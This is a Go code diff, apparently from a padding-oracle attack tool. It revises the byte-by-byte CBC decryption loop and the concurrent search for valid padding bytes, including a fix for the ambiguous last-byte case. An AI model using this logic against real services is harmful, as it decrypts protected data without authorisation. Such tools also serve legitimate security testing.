@@ -119,6 +119,7 @@ func confirmOracle(cipher []byte) error {
 	return nil
 }
 
+/* deciphers the chunk of cipher, the passed chunk shoule of length blockLen*2 */
 func decipherChunk(chunk []byte) ([]byte, error) {
 	blockLen := *config.blockLen
 
@@ -129,15 +130,15 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 	// and repeat the same procedure for every byte in that block, moving backwards
 	for pos := blockLen - 1; pos >= 0; pos-- {
 		originalByte := chunk[pos]
-		var foundByte byte
+		var foundByte *byte
 
-		/* logic for the last byte is slightly different
-		this is because we can (very unlikely, but still) run into a situation where valid padding is misleading
-		e.g. we assume that plaintext byte of valid padding is \x01, but it can be \x02 if original plaintext ends with \x02\x01
-		anyway, if you curious, check this answer:
-		https://crypto.stackexchange.com/questions/37608/clarification-on-the-origin-of-01-in-this-oracle-padding-attack?rq=1#comment86828_37609
-		*/
 		if pos == blockLen-1 {
+			/* logic for the last byte is slightly different
+			this is because we can (very unlikely, but still) run into a situation where valid padding is misleading
+			e.g. we assume that plaintext byte of valid padding is \x01, but it can be \x02 if original plaintext ends with \x02\x01
+			anyway, if you curious, check this answer:
+			https://crypto.stackexchange.com/questions/37608/clarification-on-the-origin-of-01-in-this-oracle-padding-attack?rq=1#comment86828_37609
+			*/
 			found, err := findGoodBytes(chunk, pos, 2)
 			if err != nil {
 				return nil, err
@@ -145,43 +146,51 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 
 			/* for reasons described above, we must ensure that valid padding is indeed \x01
 			we can modify second-last byte, and if padding oracle still doesn't show up, then we're good */
-			var e bool
+			secondLast := chunk[pos-1] // backup second-last byte
+
 			for _, b := range found {
-				secondLast := chunk[pos-1]           // backup second-last byte
-				chunk[pos-1]++                       // randomly modify it
+				chunk[pos] = b // the candidate byte goes to last position
+				chunk[pos-1]-- // randomly modify second-last byte
+
 				e, err := isPaddingError(chunk, nil) // and check for padding error
-				chunk[pos-1] = secondLast            // restore the byte
 				if err != nil {
 					return nil, err
 				}
+				// if padding error did not happen, it's a good byte we found!
 				if !e {
-					// yup, we found a good byte
-					foundByte = b
+					foundByte = &b
 					break
 				}
 			}
-			if e {
+
+			/* if loop above did not exit because of confirming a good byte,
+			well, something is wrong
+			i mean we just got those bytes without padding errors */
+			if foundByte == nil {
 				return nil, errors.New("Unexpected server behaviour. Aborting")
 			}
+
+			// restore second-to-last byte, remember?
+			chunk[pos-1] = secondLast
 		} else {
 			/* the logic for other positions is way simpler */
 			found, err := findGoodBytes(chunk, pos, 1)
 			if err != nil {
 				return nil, err
 			}
-			foundByte = found[0]
+			foundByte = &found[0]
 		}
 
 		// okay, now that we found the byte that fits, we can reveal the plaintext byte with some XOR magic
 		currPaddingValue := byte(blockLen - pos)
-		plainText[pos] = foundByte ^ originalByte ^ currPaddingValue
+		plainText[pos] = *foundByte ^ originalByte ^ currPaddingValue
 
 		// report to current status about deciphered plain byte
 		currentStatus.reportPlainByte(plainText[pos])
 
 		/* we need to repair the padding for the next shot
 		e.g. we need to adjust the already tampered bytes block*/
-		chunk[pos] = foundByte
+		chunk[pos] = *foundByte
 		nextPaddingValue := currPaddingValue + 1
 		adjustingValue := currPaddingValue ^ nextPaddingValue
 		for i := pos; i < blockLen; i++ {
@@ -194,13 +203,13 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 
 /* finds bytes that fit-in without causing the padding oracle
 when finds extected count, cancels all active requests*/
-func findGoodBytes(chunk []byte, pos int, expectedCount int) ([]byte, error) {
+func findGoodBytes(chunk []byte, pos int, maxCount int) ([]byte, error) {
 	/* the context will be cancelled upon returning from function */
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
 	/* output container */
-	out := make([]byte, 0, expectedCount)
+	out := make([]byte, 0, maxCount)
 
 	/* communcation channels */
 	chanVal := make(chan byte)
@@ -248,7 +257,7 @@ func findGoodBytes(chunk []byte, pos int, expectedCount int) ([]byte, error) {
 			return nil, err
 		case val := <-chanVal:
 			out = append(out, val)
-			if len(out) == expectedCount {
+			if len(out) == maxCount {
 				close(chanVal) // expect panic if recieved more valid bytes than expected, hehe
 				return out, nil
 			}
@@ -256,7 +265,10 @@ func findGoodBytes(chunk []byte, pos int, expectedCount int) ([]byte, error) {
 		// general counter of finished goroutines
 		done++
 		if done == 256 {
-			return nil, fmt.Errorf("Failed to find expected number of valid bytes (%d)", expectedCount)
+			if len(out) == 0 {
+				return nil, errors.New("Failed to decrypt. Every tried byte gave a padding error")
+			}
+			return out, nil
 		}
 	}
 }
